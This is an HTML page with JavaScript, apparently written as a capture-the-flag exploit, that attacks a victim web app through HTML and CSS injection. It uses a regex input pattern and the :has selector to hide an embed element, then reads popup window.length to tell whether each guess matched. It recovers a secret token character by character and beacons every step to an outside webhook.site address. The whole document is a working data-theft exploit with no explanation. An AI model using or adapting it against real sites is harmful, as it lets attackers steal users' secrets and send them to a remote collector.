<!doctype html>
<html><head><meta charset="utf-8"><title>o</title></head><body><pre id="out"></pre>
<script>
const K = 'https://webhook.site/b346d024-7c55-4e39-aa7f-e3c765806b56';
const Q = new URLSearchParams(location.search);
const VICTIM = Q.get('victim') || 'http://web:3000/';
const CHARS  = (Q.get('chars') || '0123456789abcdef').split('');
const NLEN   = parseInt(Q.get('len') || '16', 10);
const WAIT   = parseInt(Q.get('wait') || '380', 10);
const NL = String.fromCharCode(10);
const ANY = '(?:.|' + NL + ')*';

const out = document.getElementById('out');
function say(s){ out.textContent += s + '\n'; }
function beacon(s){ new Image().src = K + '/log?d=' + encodeURIComponent(s) + '&t=' + Date.now(); }
const sleep = ms => new Promise(r => setTimeout(r, ms));

function payload(guess){
  const css  = guess === null ? 'div{display:none}' : 'div:has(input:valid){display:none}';
  const tail = guess === null ? '' : '<input pattern="' + ANY + guess + ANY + '" value="';
  return '<link rel=stylesheet href=/zzz.txt?{}' + css + '><div><embed code=x type=text/html>' + tail;
}

function Slot(n){
  const w = window.open('about:blank', n);
  const f = document.createElement('form');
  f.method='POST'; f.enctype='multipart/form-data'; f.target=n; f.style.display='none';
  for (let i=0;i<24;i++){
    const inp=document.createElement('input'); inp.type='file'; inp.name='f'+i;
    const dt=new DataTransfer(); dt.items.add(new File(['x'],'a'+i+'.txt')); inp.files=dt.files;
    f.appendChild(inp);
  }
  document.body.appendChild(f);
  this.w=w; this.f=f;
}
Slot.prototype.fire=function(g){ this.f.action=VICTIM+'?content='+encodeURIComponent(payload(g)); this.f.submit(); };
Slot.prototype.len=function(){ try{ return this.w.length; }catch(e){ return 'err:'+e.name; } };

(async () => {
  const N = 4, S = [];
  for (let i=0;i<N;i++) S.push(new Slot('p'+i));
  say('victim='+VICTIM+' blocked='+S.filter(s=>!s.w).length);
  beacon('START victim='+VICTIM);

  // NEGATIVE CONTROL: pattern that cannot match -> embed visible -> MUST be 1
  S[0].fire('QQQQQQQQQQQQQQQQ');
  await sleep(WAIT);
  const neg = S[0].len();
  beacon('neg_control='+neg);
  if (neg !== 1){ beacon('ABORT popup_broken neg='+neg); say('ABORT neg='+neg); return; }

  // CANARY: div{display:none} -> MUST be 0
  S[0].fire(null);
  await sleep(WAIT);
  const can = S[0].len();
  beacon('canary='+can);
  if (can !== 0){ beacon('ABORT canary='+can); say('ABORT canary='+can); return; }
  beacon('CANARY_OK');

  let known = 'TOKEN_';
  for (let pos=0; pos<NLEN; pos++){
    const per = Math.ceil(CHARS.length/N);
    const groups = [];
    for (let g=0; g<N; g++) groups.push(CHARS.slice(g*per, (g+1)*per));
    for (let g=0; g<N; g++) S[g].fire(known + '(' + groups[g].join('|') + ')');
    await sleep(WAIT);
    let winner = -1;
    for (let g=0; g<N; g++) if (S[g].len() === 0) winner = g;
    if (winner < 0){ beacon('MISS '+known); say('MISS '+known); return; }
    const grp = groups[winner];
    for (let g=0; g<N; g++) S[g].fire(known + '(' + (grp[g] || 'Z') + ')');
    await sleep(WAIT);
    let ch = null;
    for (let g=0; g<N; g++) if (grp[g] && S[g].len() === 0) { ch = grp[g]; }
    if (!ch){ beacon('MISS2 '+known); say('MISS2 '+known); return; }
    known += ch;
    beacon('KNOWN '+known);
  }
  beacon('TOKEN '+known);
  say('TOKEN '+known);
})();
</script>
</body></html>
